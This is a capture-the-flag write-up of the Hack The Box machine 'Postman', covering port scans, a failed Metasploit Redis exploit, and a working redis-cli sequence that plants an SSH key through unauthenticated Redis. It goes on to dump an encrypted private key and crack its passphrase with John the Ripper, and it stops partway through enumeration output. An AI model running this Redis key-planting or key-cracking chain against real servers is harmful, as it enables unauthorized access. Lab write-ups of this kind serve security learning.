---
title: "Hack The Box - Postman"
author: Spencer Buchanan
date: "DATE"
layout: post
description: Hack the Box - Postman writeup
permalink: /hack-the-box-Postman/
categories:
  - writeup
---
# Postman
![info_card](./images/info_card.png)

# Information Gathering

## Nmap

Kicking off this box with my typical scan:

```console
root@discovery:~/htb/postman# nmap -sV -sC -vv 10.10.10.160 -oA postman
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-06 19:43 EST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:43
Completed NSE at 19:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:43
Completed NSE at 19:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:43
Completed NSE at 19:43, 0.00s elapsed
Initiating Ping Scan at 19:43
Scanning 10.10.10.160 [4 ports]
Completed Ping Scan at 19:43, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:43
Completed Parallel DNS resolution of 1 host. at 19:43, 0.03s elapsed
Initiating SYN Stealth Scan at 19:43
Scanning 10.10.10.160 [1000 ports]
Discovered open port 80/tcp on 10.10.10.160
Discovered open port 22/tcp on 10.10.10.160
Discovered open port 10000/tcp on 10.10.10.160
Completed SYN Stealth Scan at 19:43, 0.49s elapsed (1000 total ports)
Initiating Service scan at 19:43
Scanning 3 services on 10.10.10.160
Completed Service scan at 19:43, 6.07s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.160.
NSE: Starting runlevel 1 (of 3) scan.                                                                              
Initiating NSE at 19:43                                                                                            
NSE Timing: About 99.75% done; ETC: 19:44 (0:00:00 remaining)                                                      
Completed NSE at 19:44, 30.21s elapsed                                                                             
NSE: Starting runlevel 2 (of 3) scan.                                                                              
Initiating NSE at 19:44                                                                                            
Completed NSE at 19:44, 0.10s elapsed                                                                              
NSE: Starting runlevel 3 (of 3) scan.                                                                              
Initiating NSE at 19:44                                                                                            
Completed NSE at 19:44, 0.00s elapsed                                                                              
Nmap scan report for 10.10.10.160                                                                                  
Host is up, received echo-reply ttl 63 (0.024s latency).                                                           
Scanned at 2019-12-06 19:43:46 EST for 37s
Not shown: 997 closed ports
Reason: 997 resets
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDem1MnCQG+yciWyLak5YeSzxh4HxjCgxKVfNc1LN+vE1OecEx+cu0bTD5xdQJmyKEkpZ+AVjhQo/esF09a94eMNKcp+bhK1g3wqzLyr6kwE0wTncuKD2bA9LCKOcM6W5GpHKUywB5A/TMPJ7UXeygHseFUZEa+yAYlhFKTt6QTmkLs64sqCna+D/cvtKaB4O9C+DNv5/W66caIaS/B/lPeqLiRoX1ad/GMacLFzqCwgaYeZ9YBnwIstsDcvK9+kCaUE7g2vdQ7JtnX0+kVlIXRi0WXta+BhWuGFWtOV0NYM9IDRkGjSXA4qOyUOBklwvienPt1x2jBrjV8v3p78Tzz
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIRgCn2sRihplwq7a2XuFsHzC9hW+qA/QsZif9QKAEBiUK6jv/B+UxDiPJiQp3KZ3tX6Arff/FC0NXK27c3EppI=
|   256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3FKsLVdJ5BN8bLpf80Gw89+4wUslxhI3wYfnS+53Xd
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.910 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:44
Completed NSE at 19:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:44
Completed NSE at 19:44, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:44
Completed NSE at 19:44, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.42 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.040KB)
```

Off the bat its got ports **22**, **80**, and **10000** open. Going to ignore **22** for now, and focus on the other two. **80** means there is most likely a webserver. Looking at what the default scripts parsed out for us:

```console
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
```

This basically confirms what we thought. I am going to head over there first and see what's up. Before that though I am going to do an all ports scan in nmap: ```root@discovery:~/htb/postman# nmap -A -T4 -p- 10.10.10.160``` and I'll come check that after.

In going to `10.10.10.160:80` I am presented with an underconstruction personal website from the machine's creator.

![Port 80](./images/port80.png) 

Nothing really happening here that I can tell. [Wappalyzer](https://www.wappalyzer.com/) shows the site is using bootstrap 4.0.0-alpha, apache 2.4.29 and jQuery 1.12.4. I suppose we can take a look at those to see if there is anything interesting. After all, the name of the box is **POST**man, I bet that is a hint.

Back to the more thorough nmap scan before I burrow into those rabbit holes:

```console
root@discovery:~/htb/postman# nmap -A -T4 -p- 10.10.10.160
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-06 19:49 EST
Nmap scan report for 10.10.10.160
Host is up (0.022s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/6%OT=22%CT=1%CU=39901%PV=Y%DS=2%DC=T%G=Y%TM=5DEAF76
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   25.22 ms 10.10.14.1
2   25.28 ms 10.10.10.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.19 seconds
```
So what is interesting is there is another port -- **6379** -- that didn't show up before. Its running something called `Redis key-value store 4.0.9` which I haven't heard of before, I want to go down this path first. While researching, I am also going to kick off both a nikto and dirb scan to see if there is anything there. Making efficient use of time is something I have had to focus on more since OSCP.

```console
root@discovery:~/htb/postman# nmap -p 6379 10.10.10.160 --script redis-info
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-08 00:15 EST
Nmap scan report for 10.10.10.160
Host is up (0.021s latency).

PORT     STATE SERVICE
6379/tcp open  redis
| redis-info: 
|   Version: 4.0.9
|   Operating System: Linux 4.15.0-58-generic x86_64
|   Architecture: 64 bits
|   Process ID: 602
|   Used CPU (sys): 8.53
|   Used CPU (user): 3.07
|   Connected clients: 2
|   Connected slaves: 0
|   Used memory: 841.04K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|     10.10.14.23
|_    10.10.14.75

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```

```console
root@discovery:~/htb/postman# searchsploit Redis
------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                            |  Path
                                                                                          | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------ ----------------------------------------
Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)                             | exploits/linux/remote/47195.rb
Redis 5.0 - Denial of Service                                                             | exploits/linux/dos/44908.txt
Redis-cli < 5.0 - Buffer Overflow (PoC)                                                   | exploits/linux/local/44904.py
------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
```
Cool - there is a metasploit module that allows for unauthenticated RCE on the version that is on this server.

```console
msf5 exploit(linux/redis/redis_unauth_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.75:42069 
[-] 10.10.10.160:6379     - Exploit aborted due to failure: bad-config: Make sure SRVHOST not be 0.0.0.0, or the slave failed to find master.
[*] Exploit completed, but no session was created.
```

I should have known it wasn't going to be that easy. Time to go read this module and *understand* how it works. 

## Nikto

```console
root@discovery:~/htb/postman# nikto -h 10.10.10.160
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.160
+ Target Hostname:    10.10.10.160
+ Target Port:        80
+ Start Time:         2019-12-06 21:18:15 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: f04, size: 590f549ce0d74, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7865 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2019-12-06 21:22:25 (GMT-5) (250 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Dirb
```console
root@discovery:~/htb/postman# dirb http://10.10.10.160/ /usr/share/dirb/wordlists/big.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Dec  6 21:19:43 2019
URL_BASE: http://10.10.10.160/
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://10.10.10.160/ ----
==> DIRECTORY: http://10.10.10.160/css/                                                                                           
==> DIRECTORY: http://10.10.10.160/fonts/                                                                                         
==> DIRECTORY: http://10.10.10.160/images/                                                                                        
==> DIRECTORY: http://10.10.10.160/js/                                                                                            
+ http://10.10.10.160/server-status (CODE:403|SIZE:300)                                                                           
==> DIRECTORY: http://10.10.10.160/upload/                                                                                        
                                                                                                                                  
---- Entering directory: http://10.10.10.160/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                  
---- Entering directory: http://10.10.10.160/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                  
---- Entering directory: http://10.10.10.160/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                  
---- Entering directory: http://10.10.10.160/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                  
---- Entering directory: http://10.10.10.160/upload/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Dec  6 21:27:47 2019
DOWNLOADED: 20458 - FOUND: 1
```

# Exploitation  

Redis apparently stands for **RE**mote **DI**ctonary **S**erver. If I understand what it is does, its an in-memory database that can store and manipulate high-level data types. 

I found a [Redis RCE on Packetstorm](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html) from 2015 which looks like it might be suitable. 

In going through the steps as written, I ran into an error stating that I could not change directories. According to Redis, I am working from within `/var/lib/redis/`:

```console
root@discovery:~/htb/postman# redis-cli -h 10.10.10.160 config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
```

So we are stuck with operating from within that directory. I should be able to just pretend like that directory stores the authorized keys I suppose. Directing the `passwd` file to a `test` file and reading the output should let us see a little more info:

```console
root@discovery:~/htb/postman# redis-cli -h 10.10.10.160 -x set test < /etc/passwd
OK
root@discovery:~/htb/postman# redis-cli -h 10.10.10.160 getrange test 0 50000
"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false\nntp:x:105:111::/nonexistent:/usr/sbin/nologin\nmessagebus:x:106:112::/nonexistent:/usr/sbin/nologin\nuuidd:x:107:113::/run/uuidd:/usr/sbin/nologin\nredsocks:x:108:114::/var/run/redsocks:/usr/sbin/nologin\nrwhod:x:109:65534::/var/spool/rwho:/usr/sbin/nologin\niodine:x:110:65534::/var/run/iodine:/usr/sbin/nologin\ntcpdump:x:111:117::/nonexistent:/usr/sbin/nologin\nmiredo:x:112:65534::/var/run/miredo:/usr/sbin/nologin\ndnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nusbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nrtkit:x:115:121:RealtimeKit,,,:/proc:/usr/sbin/nologin\n_rpc:x:116:65534::/run/rpcbind:/usr/sbin/nologin\nDebian-snmp:x:117:123::/var/lib/snmp:/bin/false\nstatd:x:118:65534::/var/lib/nfs:/usr/sbin/nologin\npostgres:x:119:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nstunnel4:x:120:126::/var/run/stunnel4:/usr/sbin/nologin\nsshd:x:121:65534::/run/sshd:/usr/sbin/nologin\nsslh:x:122:128::/nonexistent:/usr/sbin/nologin\npulse:x:123:130:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\navahi:x:124:132:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\nsaned:x:125:133::/var/lib/saned:/usr/sbin/nologin\ninetsim:x:126:135::/var/lib/inetsim:/usr/sbin/nologin\ncolord:x:127:136:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\ngeoclue:x:128:137::/var/lib/geoclue:/usr/sbin/nologin\nlightdm:x:129:138:Light Display Manager:/var/lib/lightdm:/bin/false\nking-phisher:x:130:139::/var/lib/king-phisher:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nredis:x:131:140::/var/lib/redis:/usr/sbin/nologin\n"
```
Looks like at the bottom - `/var/lib/redis` is the user that we are accessing the server as. I want to try the steps outlined in that tutorial again, but this time I am going to set my `dir` to `/var/lib/redis/.ssh` and see if I can log into the server that way:

```console
root@discovery:~/htb/postman# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:Zg+CRMkMZTyaZS/oyyvBu0FKJ1y8sqDn5DCczbXixBY root@kali
The key's randomart image is:
+---[RSA 3072]----+
|  .*+.           |
|  .oO            |
|   O.o           |
|. =.o..          |
|oB E.o. S        |
|O.@ o .+ o       |
|=B+O .    .      |
|.OB .            |
| o=o             |
+----[SHA256]-----+
root@discovery:~/htb/postman# (echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
root@discovery:~/htb/postman# redis-cli -h 10.10.10.160 flushall
OK
root@discovery:~/htb/postman# cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
OK
root@discovery:~/htb/postman# redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh/
OK
root@discovery:~/htb/postman# redis-cli -h 10.10.10.160 config set dbfilename "authorized_keys"
OK
root@discovery:~/htb/postman# redis-cli -h 10.10.10.160 save
OK
root@discovery:~/htb/postman# ssh -i /root/.ssh/id_rsa redis@10.10.10.160
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$
```

Let me see who I am:
```console
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```
Cool, time to see if we can get the user flag.

## User Flag

[LinEnum](https://github.com/rebootuser/LinEnum) didn't turn up with anything that was immediately apparent. I won't post the results here unless there is something later on since the length of that output is quite long.

Looking through my notes from previous machines and my standard linux enumeration process. I should be looking for any private keys. 

```console
redis@Postman:~$ cd /opt
redis@Postman:/opt$ ls
id_rsa.bak
redis@Postman:/opt$ cat id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
redis@Postman:/opt$ 
```

Well there's one. I am going to copy this over to my machine and see if we can crack the passphrase for it. First we'll need to make a hash of it, john has a script that will take care of that for me:

```console
root@discovery:~/htb/postman# /usr/share/john/ssh2john.py private_key.key > keyhash
root@discovery:~/htb/postman# cat keyhash
private_key.key:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63
```

Next step is to run it through john himself -- a rule of thumb is to use rockyou.txt as your first wordlist, it has been my experience in CTFs that the brute forcing should not be lengthy if required and will typically be in standard wordlists such as this. 

```console
root@discovery:~/htb/postman# john --wordlist=rockyou.txt keyhash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (private_key.key)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:16 DONE (2019-12-08 21:44) 0.06020g/s 863437p/s 863437c/s 863437C/sa6_123..*7¡Vamos!
Session completed
root@discovery:~/htb/postman# 
```

So it looks like `computer2008` is potentially the passphrase for this key. We now need to find what user its for, since the user `Redis` which we are currently in the box as did not require us to use a passphrase - just a key.

Back to the LinEnum output:

```console
[-] It looks like we have some admin users:
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
